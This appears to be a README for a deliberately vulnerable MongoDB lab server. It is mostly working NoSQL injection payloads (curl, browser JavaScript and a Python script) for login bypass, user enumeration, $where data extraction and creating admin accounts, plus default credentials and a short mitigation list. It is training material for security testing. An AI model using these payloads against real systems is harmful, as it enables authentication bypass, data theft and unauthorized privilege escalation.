# NoSQL Injection Testing Guide - MongoDB Atlas

🚨 **EDUCATIONAL PURPOSE ONLY** - This server contains real MongoDB NoSQL injection vulnerabilities for security testing.

## Server Information

- **Database**: MongoDB Atlas (Real Database)
- **Port**: 5001
- **Database Name**: vulnerable_admin
- **Connection**: `mongodb+srv://saud1hashone:***@cluster0.thaumjt.mongodb.net/`

## Quick Start

```bash
# Start the MongoDB NoSQL injection server
node server-mongo.js

# Or use npm script
npm run mongo
```

## 🔥 REAL NoSQL Injection Attacks

### 1. Authentication Bypass (Login)

#### Basic Bypass - Always True

```bash
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$ne": null},
    "password": {"$ne": null}
  }'
```

#### Regex Bypass - Match Any

```bash
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": ".*"},
    "password": {"$regex": ".*"}
  }'
```

#### Specific User Bypass

```bash
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": {"$ne": "wrongpassword"}
  }'
```

#### Greater Than Bypass

```bash
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
  }'
```

### 2. User Enumeration

#### Find All Users

```bash
curl "http://localhost:5001/api/users?search[username][\$regex]=.*"
```

#### Find Admin Users

```bash
curl "http://localhost:5001/api/users?role[\$regex]=Admin"
```

#### Find Users by Pattern

```bash
curl "http://localhost:5001/api/users?search[username][\$regex]=^a"
```

#### Extract All User Data

```bash
curl "http://localhost:5001/api/users?search[\$where]=this.username.length%20%3E%200"
```

### 3. Privilege Escalation

#### Create Admin User

```bash
curl -X POST http://localhost:5001/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "password": "hacked123",
    "email": "hacker@evil.com",
    "role": "Administrator",
    "isAdmin": true,
    "superuser": true
  }'
```

#### Create User with MongoDB Operators

```bash
curl -X POST http://localhost:5001/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "injected",
    "$set": {"role": "Administrator"},
    "$unset": {"limitations": ""}
  }'
```

### 4. Advanced MongoDB Injection

#### Using $where Operator

```bash
curl "http://localhost:5001/api/users?search[\$where]=this.password.length%20%3E%205"
```

#### Using $exists Operator

```bash
curl "http://localhost:5001/api/users?search[password][\$exists]=true"
```

#### Using $in Operator

```bash
curl "http://localhost:5001/api/users?role[\$in][]=Administrator&role[\$in][]=Manager"
```

### 5. Browser-Based Testing

Open browser console and run these JavaScript payloads:

#### Login Bypass in Browser

```javascript
fetch("http://localhost:5001/api/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    username: { $ne: null },
    password: { $ne: null },
  }),
})
  .then((r) => r.json())
  .then(console.log);
```

#### User Enumeration in Browser

```javascript
fetch("http://localhost:5001/api/users?search[username][$regex]=.*")
  .then((r) => r.json())
  .then(console.log);
```

### 6. Python Automation Script

```python
import requests
import json

base_url = "http://localhost:5001"

# Test 1: Login bypass
print("🔥 Testing NoSQL Login Bypass...")
login_payload = {
    "username": {"$ne": None},
    "password": {"$ne": None}
}
response = requests.post(f"{base_url}/api/login", json=login_payload)
print(f"Login Bypass: {response.status_code} - {response.json()}")

# Test 2: User enumeration
print("\n🔥 Testing User Enumeration...")
response = requests.get(f"{base_url}/api/users", params={
    "search[username][$regex]": ".*"
})
print(f"User Enum: {response.status_code} - Found {len(response.json())} users")

# Test 3: Create malicious user
print("\n🔥 Testing Privilege Escalation...")
evil_user = {
    "username": "nosql_hacker",
    "password": "hacked123",
    "role": "Administrator",
    "isAdmin": True
}
response = requests.post(f"{base_url}/api/users", json=evil_user)
print(f"Evil User: {response.status_code} - {response.json()}")
```

## 🎯 MongoDB-Specific Operators to Test

### Comparison Operators

- `$eq` - Equal
- `$ne` - Not equal
- `$gt` - Greater than
- `$gte` - Greater than or equal
- `$lt` - Less than
- `$lte` - Less than or equal
- `$in` - In array
- `$nin` - Not in array

### Logical Operators

- `$or` - Logical OR
- `$and` - Logical AND
- `$not` - Logical NOT
- `$nor` - Logical NOR

### Element Operators

- `$exists` - Field exists
- `$type` - Field type

### Evaluation Operators

- `$regex` - Regular expression
- `$where` - JavaScript expression

### Array Operators

- `$all` - All elements
- `$elemMatch` - Element match
- `$size` - Array size

## 🚨 Real Database Impact

⚠️ **WARNING**: This server uses your actual MongoDB Atlas database!

### What's Real:

- ✅ Real MongoDB Atlas connection
- ✅ Real NoSQL injection vulnerabilities
- ✅ Actual data insertion/modification
- ✅ Real database queries with injection
- ✅ Actual user creation and privilege escalation

### Database Operations Possible:

- View all users and their passwords
- Create new admin users
- Modify existing user roles
- Extract sensitive information
- Bypass authentication entirely

## 🔧 Testing Checklist

- [ ] Authentication bypass with `$ne` operator
- [ ] User enumeration with `$regex`
- [ ] Privilege escalation via user creation
- [ ] Data extraction with `$where`
- [ ] Role manipulation
- [ ] Password field enumeration
- [ ] Admin user creation
- [ ] Database error information disclosure

## 📋 Sample Valid Credentials

- Username: `admin` / Password: `admin123` (Administrator)
- Username: `user1` / Password: `user123` (User)

## 🛡️ Mitigation Techniques

1. **Input Validation**: Validate and sanitize all inputs
2. **Type Checking**: Ensure inputs are expected types (string, not object)
3. **Parameterized Queries**: Use Mongoose schema validation
4. **Whitelist Operators**: Only allow safe MongoDB operators
5. **Authentication**: Implement proper session management
6. **Authorization**: Check user permissions before operations

Remember: This is for educational purposes to understand NoSQL injection vulnerabilities!
